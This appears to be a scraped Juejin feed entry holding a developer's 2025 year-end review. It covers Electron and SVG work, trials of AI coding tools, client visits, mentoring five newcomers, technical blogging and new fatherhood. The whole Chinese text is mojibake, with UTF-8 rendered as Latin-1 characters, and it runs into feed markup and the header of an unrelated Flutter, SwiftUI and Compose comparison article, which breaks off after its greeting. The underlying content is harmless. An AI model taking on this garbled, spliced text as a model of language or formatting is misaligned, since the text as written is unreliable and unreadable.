<p>2025 è¿™ä¸€å¹´ï¼Œæ›´åƒå¹¶è¡Œæ¨è¿›ç€ä¸¤ä»¶äº‹ â€”â€” å·¥ä½œä¸Šå®Œæˆäº† 35 + éœ€æ±‚ï¼Œè·‘äº† 10 æ¬¡å®¢æˆ·ç°åœºå¯¹æ¥éœ€æ±‚ã€è§£å†³é—®é¢˜ï¼Œå‚ä¸äº†ä¸€æ¬¡æŠ•æ ‡ï¼ŒåŒæ—¶å¸¦æ•™çš„ 5 åæ–°äººä¹Ÿèƒ½ç‹¬ç«‹æ‰¿æ‹…å·¥ä½œäº†ã€‚ç‹¬ç«‹åšäº†ä¸ª UML å»ºæ¨¡çš„æ¡Œé¢ç«¯åº”ç”¨ï¼Œä»éœ€æ±‚æ¢³ç†åˆ°ä¸Šçº¿çš„å…¨æµç¨‹éƒ½èµ°é€šäº†ã€‚</p>
<p>å†™æ–‡çš„èŠ‚å¥ä¹Ÿæ²¡æ–­ï¼Œä»Šå¹´ä¸€å…±è¾“å‡ºäº† 20 å¤šç¯‡åŸåˆ›æŠ€æœ¯æ–‡ç« ï¼Œå†…å®¹éƒ½æ˜¯å®é™…å·¥ä½œé‡Œçš„ç»éªŒï¼šæ¯”å¦‚ Jenkins æ‰“åŒ…é‡åˆ°çš„é—®é¢˜ã€è¿œç¨‹å¸¦æ–°äººçš„æµç¨‹ã€ç”¨ SVG å®ç°æ€ç»´å¯¼å›¾å’Œ UML å…³ç³»çº¿ï¼Œè¿˜æœ‰ç‹¬ç«‹å¼€å‘æ¡Œé¢åº”ç”¨çš„è¿‡ç¨‹ã€ç°åœºç´§æ€¥æ’æŸ¥æ€§èƒ½é—®é¢˜çš„æ–¹æ³•ï¼Œç®—æ˜¯æŠŠå®æ“é‡Œçš„ç»éªŒéƒ½æ•´ç†æˆäº†æ–‡å­—ã€‚</p>
<p>å®¶åº­è¿™è¾¹æ˜¯å…¨æ–°çš„ç”Ÿæ´»åº•è‰² â€”â€” å„¿å­å‡ºç”Ÿåï¼Œæˆ‘ä¿©å½»åº•åˆ‡æ¢æˆæ–°æ‰‹çˆ¸å¦ˆæ¨¡å¼ï¼Œä»æ‰‹å¿™è„šä¹±åœ°æ¢å°¿å¸ƒã€å­¦æ‹å—ï¼Œåˆ°æ…¢æ…¢æ‘¸æ¸…ä»–çš„ä½œæ¯è§„å¾‹ã€‚ä»Šå¹´ä»–æœ‰ä¸‰æ¬¡å‘çƒ§ï¼Œå¤œé‡Œæ¯éš”ä¸€å°æ—¶å°±çˆ¬èµ·æ¥é‡ä½“æ¸©ã€åšç‰©ç†é™æ¸©ï¼Œåå¤šä¸ªæ™šä¸Šç†¬ä¸‹æ¥ï¼Œè¿å¤œé‡Œé†’å‡ æ¬¡ã€è¯¥å–‚å¤šå°‘æ°´éƒ½å½¢æˆäº†è‚Œè‚‰è®°å¿†ï¼Œæ€»ç®—ä»æœ€åˆçš„æ…Œæ…Œå¼ å¼ ï¼Œæ…¢æ…¢ç»ƒæˆäº†é‡äº‹ä¸æ…Œçš„ â€œç†Ÿç»ƒå·¥â€ã€‚</p>
<p>è¿™ä¸€å¹´ä¸ç®—è½»æ¾ï¼Œæ”¹ bug çš„é—´éš™è¦ç›¯ç€æ–°äººçš„è¿›åº¦ï¼Œå“„å¨ƒç¡ç†Ÿåä¼šé¡ºæ‰‹ç†ä¸€ç†æ–‡ç« çš„æ€è·¯ã€‚ä½†å›å¤´çœ‹ï¼Œå·¥ä½œé‡Œçš„éœ€æ±‚éƒ½è½äº†åœ°ï¼Œè‡ªå·±åšçš„åº”ç”¨è·‘é€šäº†æµç¨‹ï¼Œå®¶é‡Œçš„å°å®¶ä¼™ä¹Ÿå®‰ç¨³é•¿å¤§ï¼Œè¿™äº›äº‹å„¿ç®—æ˜¯éƒ½ç¨³ç¨³æ¥ä½äº†ã€‚</p>
<h2 data-id="heading-1">ç ”å‘æ·±è€•</h2>
<p>ä»Šå¹´åœ¨å…¬å¸å¹²çš„æ´»å„¿è¿˜æ˜¯æ‚è€Œå®ï¼Œä½œä¸ºå…¨å¹²å·¥ç¨‹å¸ˆï¼Œæ—¥å¸¸å°±æ˜¯å›´ç€  Electronã€SVG å›¾å½¢ç»˜åˆ¶é€»è¾‘è®¡ç®—ã€Nestjs è½¬ï¼Œå¶å°”è¿˜å¾—å•ƒç‚¹æ“ä½œç³»ç»Ÿç›¸å…³çš„çŸ¥è¯†ï¼ŒæŠ€æœ¯é¢é“ºå¾—æ¯”è¾ƒå¼€ã€‚å¥½åœ¨å·²ç»åœ¨å…¬å¸å¾…äº†ä¸¤å¹´åŠï¼Œä¸ç®¡æ˜¯å‰ç«¯è¿˜æ˜¯ Node ç«¯çš„é“¾è·¯ï¼Œç°åœ¨æ‘¸å¾—éƒ½å¾ˆé€ï¼Œå¯¹æ•´ä¸ªé¡¹ç›®çš„æŠŠæ§åŠ›ä¹Ÿæ¯”ä»¥å‰å¼ºå¤šäº†ï¼Œé‡åˆ°è·¨æ¨¡å—çš„é—®é¢˜ä¹Ÿèƒ½å¿«é€Ÿç†é¡ºã€‚</p>
<p>AI ç¼–ç¨‹æ˜¯æˆ‘ä»Šå¹´èŠ±å¿ƒæ€æœ€å¤šã€æ¢ç´¢æœ€ä¹…çš„ä¸€å—ã€‚å‰å‰ååè¯•äº†ä¸å°‘å·¥å…·ï¼Œtrae çš„æµ·å¤–ç‰ˆå’Œä¸­æ–‡ç‰ˆéƒ½å¸¸ç”¨ï¼Œè¿˜æœ‰ cursorã€kiroã€windsurfã€qoder è¿™äº›ï¼Œå›½å†…çš„è±†åŒ…ã€é€šä¹‰åƒé—®ã€kimi ä¹Ÿéƒ½æŒ¨ä¸ªæµ‹è¿‡ã€‚ä»ä¸€å¼€å§‹ç¢ç£¨æ€ä¹ˆä¼˜åŒ–æç¤ºè¯ï¼Œåˆ°åæ¥å®šè§„åˆ™ã€æ spec ç¼–ç¨‹ï¼Œä¸€æ­¥æ­¥è¯•ç€æŠŠ AI ç¼–ç¨‹å¾€å·¥ç¨‹åŒ–é ï¼Œä¸æ˜¯éšä¾¿ç”¨ç”¨å›¾ä¸ªå¿«ï¼Œè€Œæ˜¯æƒ³è®©å®ƒçœŸæ­£é€‚é…æ—¥å¸¸å¼€å‘æµç¨‹ã€‚é è¿™äº›å·¥å…·çœäº†ä¸å°‘é‡å¤åŠ³åŠ¨çš„æ—¶é—´ï¼Œç»ˆäºèƒ½æŠŠç²¾åŠ›æ”¾åœ¨æ ¸å¿ƒä¸šåŠ¡ä¸Šï¼Œä¹Ÿæœ‰åŠŸå¤«ç³»ç»Ÿæ€§åœ°æ‘¸é€ä¸šåŠ¡é€»è¾‘ï¼Œè·Ÿå®æ–½å›¢é˜Ÿã€ç°åœºä¸šåŠ¡æ–¹æ²Ÿé€šä¹Ÿæ›´é¡ºç•…äº†ï¼Œç°åœ¨å¯¹æ•´ä¸ªä¸šåŠ¡æµç¨‹çš„æ¥é¾™å»è„‰éƒ½é—¨å„¿æ¸…ã€‚</p>
<p>æˆ‘ä¹Ÿæ²¡å›°åœ¨ç°æœ‰å·¥ä½œçš„è¾¹ç•Œé‡Œï¼Œæƒ³ç€å¤šæ‹“å±•ä¸‹è‡ªå·±çš„é¢†åŸŸã€‚é™¤äº†å…¥é—¨ Java å†™ç‚¹ demo ç»ƒæ‰‹ï¼Œè¿˜è‡ªå·±æ£é¼“äº†é‚£ä¸ª UML å»ºæ¨¡çš„æ¡Œé¢ç«¯åº”ç”¨ï¼Œå¼€å‘çš„æ—¶å€™ä¸»åŠ¨è¡¥äº†äº›æ“ä½œç³»ç»Ÿçš„çŸ¥è¯†ï¼Œç®—æ˜¯è·³å‡ºèˆ’é€‚åŒºå¤šå­¦äº†ç‚¹ä¸œè¥¿ã€‚</p>
<p>å¯¹å¤–å¯¹æ¥çš„æ´»å„¿ä¹Ÿæ²¡è½ä¸‹ï¼Œå…¨å¹´è·‘äº† 10 æ¬¡å®¢æˆ·ç°åœºï¼Œéœ€æ±‚ç¡®è®¤ã€æ’æŸ¥é—®é¢˜ã€éªŒæ”¶è½åœ°ä¸€å¥—æµç¨‹èµ°ä¸‹æ¥éƒ½é¡ºé¡ºåˆ©åˆ©ï¼Œç¡®ä¿å®¢æˆ·è¦çš„ä¸œè¥¿èƒ½ç²¾å‡†è½åœ°ã€‚å¦å¤–è¿˜å…¨ç¨‹è·Ÿç€å‚ä¸äº†ä¸€æ¬¡æŠ•æ ‡ï¼Œè´Ÿè´£å†™æŠ€æœ¯æ–¹æ¡ˆã€å‡†å¤‡æ”¯æ’‘ææ–™ï¼Œä¹Ÿç®—å¸®å›¢é˜ŸæŠŠè¿™ä¸ªä¸“é¡¹çš„äº‹å„¿æ‰›äº†ä¸‹æ¥ã€‚</p>
<h2 data-id="heading-2">å›¢é˜Ÿå¸¦æ•™</h2>
<p>ä»Šå¹´è¿˜æœ‰ä¸ªå˜åŒ–ï¼Œå°±æ˜¯å¼€å§‹ä¸»åŠ¨å¾€ç®¡ç†ã€å¸¦äººè¿™å—é ï¼Œä¸å†åªç›¯ç€è‡ªå·±çš„ä»£ç ï¼Œæ„¿æ„æ¥äº›å›¢é˜Ÿç®¡ç†çš„æ´»å„¿ï¼Œè¯•ç€åšä¸šåŠ¡å’Œå›¢é˜Ÿçš„ â€œæŒèˆµäººâ€ï¼Œè€Œä¸åªæ˜¯ä¸ªæŠ€æœ¯æ‰§è¡Œè€…ã€‚å…¨å¹´å¸¦äº† 5 ä¸ªæ–°äººï¼Œä»å…¥é—¨æ€ä¹ˆä¸Šæ‰‹ã€ä»£ç è§„èŒƒæ€ä¹ˆå®ˆï¼Œåˆ°ç†Ÿæ‚‰ä¸šåŠ¡ã€è·Ÿç€åšé¡¹ç›®å®æ“ï¼Œå…¨æµç¨‹éƒ½é™ªç€ä»–ä»¬èµ°ã€‚</p>
<p>æˆ‘ä¼šè®°ç€æ¯ä¸ªæ–°äººä»€ä¹ˆæ—¶å€™èƒ½ç‹¬ç«‹æ¥å•ï¼Œé‡åˆ°ä»–ä»¬å¡å£³çš„åœ°æ–¹ï¼Œå°±é’ˆå¯¹æ€§åœ°å¸®ç€æ¢³ç†éš¾ç‚¹ã€é¿å‘ã€‚æ…¢æ…¢ä¹Ÿæ€»ç»“å‡ºäº›å®ç”¨çš„å¸¦æ•™æ–¹æ³•ï¼Œä¸æ˜¯å…‰é è¯´ï¼Œè€Œæ˜¯æŠŠå¤æ‚ä¸šåŠ¡æ‹†æˆä¸€æ­¥æ­¥çš„å°ä»»åŠ¡ï¼Œå†å®šæœŸè·Ÿä»–ä»¬ç­”ç–‘å¤ç›˜ï¼Œè¿™äº›æ–¹æ³•ä¹Ÿæ•´ç†æˆäº†å¯å¤ç”¨çš„æµç¨‹ï¼Œåé¢å†å¸¦äººå°±èƒ½çœä¸å°‘åŠ²ã€‚çœ‹ç€æ–°äººä¸€ä¸ªä¸ªèƒ½ç‹¬å½“ä¸€é¢ï¼Œæˆ‘è‡ªå·±çš„ç»Ÿç­¹åè°ƒã€è·Ÿäººæ²Ÿé€šçš„èƒ½åŠ›ä¹Ÿè·Ÿç€æä¸Šæ¥äº†ï¼Œç®—æ˜¯åŒå‘æˆé•¿å§ã€‚</p>
<h2 data-id="heading-3">å†…å®¹åˆ›ä½œ</h2>
<p>ä»Šå¹´å†™æŠ€æœ¯æ–‡ç« ï¼Œå¯¹æˆ‘æ¥è¯´æ›´åƒæ˜¯ä¸ªäººå¤ç›˜å’Œè®°å½•çš„è¿‡ç¨‹ï¼Œä¸æ˜¯ä¸ºäº†åˆ»æ„åˆ†äº«ï¼Œæ›´å¤šæ˜¯ç”¨è¾“å‡ºå€’é€¼è‡ªå·±è¾“å…¥å’Œæ¢³ç†ã€‚æ¯ä¸€ç¯‡éƒ½æ˜¯å®æˆ˜é‡Œæ‘¸çˆ¬æ»šæ‰“çš„æ€»ç»“ï¼Œä¸ç®¡æ˜¯ Jenkins æ‰“åŒ…è¸©çš„å‘ã€SVG ç»˜åˆ¶çš„å®æ“æŠ€å·§ï¼Œè¿˜æ˜¯ AI ç¼–ç¨‹çš„æ¢ç´¢å¿ƒå¾—ã€ç‹¬ç«‹å¼€å‘æ¡Œé¢åº”ç”¨çš„æµç¨‹ï¼Œéƒ½ä¸€ä¸€è®°äº†ä¸‹æ¥ï¼Œå‘å¸ƒåœ¨æ˜é‡‘ä¸Šã€‚</p>
<p>è¿™äº›æ–‡å­—ä¹Ÿæ˜¯ç»™æˆ‘è‡ªå·±çš„èŒä¸šç”Ÿæ¶¯ç•™ä¸ªå°è®°ã€‚å“ªæ€•ä»¥åè½¬è¡Œåšäº†åˆ«çš„ï¼Œå›å¤´ç¿»ä¸€ç¿»ï¼Œä¹Ÿèƒ½æƒ³èµ·è¿™æ®µå’Œä»£ç æ‰“äº¤é“çš„æ—¥å­ï¼Œæ¸…æ¥šè‡ªå·±æ¯ä¸€æ­¥æ˜¯æ€ä¹ˆè¿‡æ¥çš„ã€‚è€Œä¸”å†™çš„è¿‡ç¨‹æœ¬èº«å°±æ˜¯é‡æ–°æ¢³ç†é€»è¾‘ã€æŸ¥æ¼è¡¥ç¼ºï¼Œç›¸å½“äºå†æŠŠå·¥ä½œé‡Œçš„çŸ¥è¯†ç‚¹è¿‡ä¸€éï¼Œæ—¢å·©å›ºäº†æŠ€èƒ½ï¼Œä¹Ÿèƒ½ç»™æœ‰åŒæ ·å›°æƒ‘çš„åŒè¡Œä¸€ç‚¹å‚è€ƒï¼Œç®—æ˜¯æ„å¤–çš„æ”¶è·ã€‚</p>
<h2 data-id="heading-4">å®¶åº­æ–°ç« </h2>
<p>ä»Šå¹´æœ€é‡å¤§çš„å˜åŒ–ï¼Œå°±æ˜¯è§£é”äº†çˆ¸çˆ¸è¿™ä¸ªæ–°èº«ä»½ï¼Œä¹ŸçœŸæ­£æ‡‚äº†ä»€ä¹ˆæ˜¯å®¶åº­è´£ä»»æ„Ÿã€‚å·¥ä½œä¹‹ä½™çš„å¤§éƒ¨åˆ†æ—¶é—´ï¼Œå‡ ä¹éƒ½è€—åœ¨äº†å®¶é‡Œçš„å°å¯çˆ±èº«ä¸Šï¼Œé™ªä»–ç©ã€å“„ä»–ç¡ã€å¤„ç†å„ç§çç¢çš„ç…§æ–™äº‹å®œï¼Œæ—¥å­è¢«è¿™äº›ç»†ç¢çš„æ—¶å…‰å¡«æ»¡ã€‚</p>
<p>è¿™ä»½æ–°èº«ä»½å¸¦æ¥çš„ï¼Œæ˜¯å¿«ä¹å’Œç–²æƒ«å¯¹åŠå¼€çš„æ—¥å¸¸ã€‚å°å®¶ä¼™ä¸‰æ¬¡å‘çƒ§çš„å¤œé‡Œï¼Œæˆ‘å‡ ä¹æ²¡åˆè¿‡çœ¼ï¼Œéš”ä¸€å°æ—¶å°±æ‘¸ä¸€æ¬¡ä½“æ¸©ã€æ“¦ä¸€éèº«å­ï¼Œå‡ ä¸ªé€šå®µç†¬ä¸‹æ¥ï¼Œè¿èµ°è·¯éƒ½æœ‰ç‚¹é£˜ã€‚ä¹Ÿæ˜¯è¿™æ—¶å€™æ‰æ‡‚ï¼Œå½“çˆ¶æ¯å“ªæœ‰ä»€ä¹ˆå¾—å¿ƒåº”æ‰‹ï¼Œå…¨æ˜¯ç¡¬æ‰›è¿‡æ¥çš„ã€‚</p>
<p>å¿«ä¹æ˜¯å®æ‰“å®çš„ â€”â€” è¢«ä»–æ”¥ç€æ‰‹æŒ‡å’¿å‘€å­¦è¯­ï¼Œçœ‹ä»–ç¡é†’åå’§å˜´ç¬‘çš„æ¨¡æ ·ï¼Œä½†ç–²æƒ«ä¹Ÿæ˜¯çœŸçœŸåˆ‡åˆ‡çš„ï¼Œæ˜¯æ–°æ‰‹çˆ¸å¦ˆé¢å¯¹å­©å­å‘çƒ§æ—¶çš„æ‰‹è¶³æ— æªï¼Œæ˜¯ç†¬å®Œå¤œè¿˜è¦èµ¶å»å…¬å¸å¼€ä¼šçš„å…µè’é©¬ä¹±ã€‚</p>
<p>ä¸€è¾¹æ˜¯å‚¬ç€ä¸Šçº¿çš„éœ€æ±‚ã€æ’æ»¡è¡Œç¨‹çš„å‡ºå·®ã€ç­‰ç€å¸¦æ•™çš„æ–°äººï¼Œä¸€è¾¹æ˜¯ç¦»ä¸å¼€äººç…§é¡¾çš„å¨ƒå’Œä¸€å †å®¶åŠ¡çäº‹ï¼Œè¿™ç§æ‹‰æ‰¯æ„Ÿç¼ äº†ä¸€æ•´å¹´ã€‚åŸæ¥æ‰€è°“çš„ä¸­å¹´äººæ—¶åˆ»ï¼Œå°±æ˜¯è¿™æ ·ï¼Œè°ˆä¸ä¸Šä»€ä¹ˆå¹³è¡¡ï¼Œæ— éæ˜¯åœ¨å·¥ä½œå’Œå®¶åº­çš„å¤¹ç¼é‡Œï¼Œä¸€è¾¹ç‹¼ç‹ˆåº”ä»˜ï¼Œä¸€è¾¹å’¬ç‰™æ‰›èµ·è¯¥æ‹…çš„è´£ä»»ã€‚</p>
<h2 data-id="heading-5">æ¥å¹´è§„åˆ’</h2>
<p>æ—¶å…‰åŒ†åŒ†ï¼Œ2025 å¹´è½¬çœ¼å³é€ã€‚æ–°çš„ä¸€å¹´ä¸è´ªå¤šæ±‚å…¨ï¼Œå°±æ²‰ä¸‹å¿ƒæŠŠå‡ ä»¶äº‹åšæ‰å®ï¼Œç¨³æ­¥å¾€å‰æ¨è¿›ã€‚</p>
<p>æŠ€æœ¯å’Œå·¥ä½œä¸Šï¼Œé‡ç‚¹æŠ“ä¸¤ä»¶äº‹ã€‚</p>
<ol>
<li>æ˜¯æŠŠ AI ç¼–ç¨‹å·¥ç¨‹åŒ–è¿™æ¡è·¯èµ°æ·±èµ°é€ï¼Œå¤šç¢ç£¨é€‚é…æ—¥å¸¸å¼€å‘çš„è½åœ°æŠ€å·§ï¼Œé å®ƒè§£æ”¾åŒæ‰‹ã€å‡å°‘é‡å¤åŠ³åŠ¨ï¼Œçœå‡ºæ›´å¤šç²¾åŠ›è·³å‡ºä»£ç æœ¬èº«ã€‚ä¸å†åªåšåŸ‹å¤´æ•²ä»£ç çš„æ‰§è¡Œè€…ï¼Œä¸»åŠ¨å¾€å‰ç«™ä¸€æ­¥ï¼Œæ‘¸æ¸…ä¸šåŠ¡çš„åº•å±‚é€»è¾‘å’Œæ ¸å¿ƒè¯‰æ±‚ï¼Œè¯»æ‡‚ä¸šåŠ¡èƒŒåçš„ä»·å€¼ï¼Œè®©è‡ªå·±åœ¨å·¥ä½œä¸­æ›´æœ‰è¯è¯­æƒã€‚</li>
<li>æ˜¯ç»§ç»­æ‹“å±•ç‹¬ç«‹å¼€å‘çš„è¾¹ç•Œï¼Œä¸å†å±€é™äºç°æœ‰æˆæœï¼Œä¸»åŠ¨æ¢ç´¢æ–°çš„åº”ç”¨æ–¹å‘ï¼Œä»é›¶åˆ°ä¸€æ‰“é€ æ–°çš„è‡ªç ”é¡¹ç›®ï¼Œäº‰å–åšå‡ºèƒ½è§£å†³å®é™…éœ€æ±‚ã€è®©æ›´å¤šäººç”¨å¾—ä¸Šçš„äº§å“ï¼Œè®©æŠ€æœ¯è½åœ°äº§ç”ŸçœŸæ­£çš„ä»·å€¼ã€‚</li>
</ol>
<p>å›¢é˜Ÿå¸¦æ•™æ–¹é¢ï¼Œæ‰“ç ´ç°æœ‰å•ä¸€æ¨¡å¼ï¼Œå¤šæ¢ç´¢çµæ´»é«˜æ•ˆçš„æ–¹æ³•ã€‚ä¸å…‰æ˜¯é æ‰‹æŠŠæ‰‹å¸¦ç»ƒï¼Œè¿˜ä¼šç»“åˆ AI å·¥å…·ä¼˜åŒ–å¸¦æ•™æµç¨‹ï¼Œæ•´ç†æ ‡å‡†åŒ–æ‰‹å†Œçš„åŒæ—¶ï¼Œå¢åŠ æ¡ˆä¾‹å¤ç›˜ã€ä»»åŠ¡æ‹†è§£å®æ“ç­‰ç¯èŠ‚ï¼Œé’ˆå¯¹æ€§åŒ¹é…ä¸åŒæ–°äººçš„æ¥å—èŠ‚å¥ï¼Œæ—¢æé«˜å¸¦æ•™æ•ˆç‡ï¼Œä¹Ÿèƒ½è®©æ–°äººæ›´å¿«ç‹¬å½“ä¸€é¢ã€‚</p>
<p>ç”Ÿæ´»ä¸Šï¼Œæ ¸å¿ƒæ˜¯æŠŠèŠ‚å¥è°ƒé¡ºã€è¿‡å‡ºè´¨æ„Ÿã€‚ä¸€ç›´åšä¿¡å·¥ä½œæ˜¯ä¸ºäº†æ›´å¥½çš„ç”Ÿæ´»ï¼Œè€Œéè¢«å·¥ä½œè£¹æŒŸã€‚æ–°çš„ä¸€å¹´è¦ç æ‰æ— æ•ˆå¿™ç¢Œï¼Œå¤šç•™äº›é«˜è´¨é‡é™ªä¼´ç»™å®¶äººï¼Œé™ªç€å­©å­æ…¢æ…¢é•¿å¤§ï¼Œå¤šä¸ºå®¶é‡Œæ·»äº›çƒŸç«æ°”å’Œå®å®åœ¨åœ¨çš„å¿«ä¹ï¼Œåœ¨ä¸ªäººæˆé•¿å’Œå®¶åº­æ¸©æš–ä¹‹é—´æ‰¾åˆ°èˆ’æœçš„å¹³è¡¡ç‚¹ï¼Œä¸è¾œè´Ÿæ¯ä¸€æ®µé™ªä¼´çš„æ—¶å…‰ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨ Flutterã€SwiftUI å’Œ Compose å†™åŒä¸€ä¸ªç•Œé¢ï¼šä¸€ä»½çœŸå®å¼€å‘è€…çš„å®æµ‹æŠ¥å‘Š]]></title>    <link>https://juejin.cn/post/7589082912589086763</link>    <guid>https://juejin.cn/post/7589082912589086763</guid>    <pubDate>2025-12-30T00:15:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589082912589086763" data-draft-id="7587672626757697555" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨ Flutterã€SwiftUI å’Œ Compose å†™åŒä¸€ä¸ªç•Œé¢ï¼šä¸€ä»½çœŸå®å¼€å‘è€…çš„å®æµ‹æŠ¥å‘Š"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-30T00:15:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JarvanMo"/> <meta itemprop="url" content="https://juejin.cn/user/2348212565845704"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨ Flutterã€SwiftUI å’Œ Compose å†™åŒä¸€ä¸ªç•Œé¢ï¼šä¸€ä»½çœŸå®å¼€å‘è€…çš„å®æµ‹æŠ¥å‘Š
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2348212565845704/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JarvanMo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T00:15:46.000Z" title="Tue Dec 30 2025 00:15:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å˜¿ï¼Œæœ‹å‹ï¼ğŸ‘‹</p>
